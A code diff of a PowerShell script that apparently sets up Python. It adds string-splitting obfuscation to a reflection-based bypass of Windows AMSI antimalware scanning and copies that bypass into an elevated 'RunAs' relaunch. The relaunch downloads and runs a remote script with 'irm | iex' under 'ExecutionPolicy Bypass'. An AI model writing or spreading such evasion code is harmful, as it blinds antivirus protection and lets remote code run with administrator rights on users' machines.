@@ -9,13 +9,14 @@ $Self = "$Raw/a.ps1"
 $PyVer = "3.12.10"
 
 if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
-    Start-Process powershell -Verb RunAs -ArgumentList "-NoProfile -ExecutionPolicy Bypass -Command `"irm $Self | iex`""
+    $cmd = '-NoProfile -ExecutionPolicy Bypass -Command "$a=[Ref].Assembly.GetType(''System.Management.Automation.Amsi''+''Utils'');$a.GetField(''amsi''+''InitFailed'',''NonPublic,Static'').SetValue($null,$true);irm ' + $Self + ' | iex"'
+    Start-Process powershell -Verb RunAs -ArgumentList $cmd
     exit
 }
 
 try {
-    $a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
-    $a.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+    $a = [Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils')
+    $a.GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)
 } catch {}
 
 Clear-Host
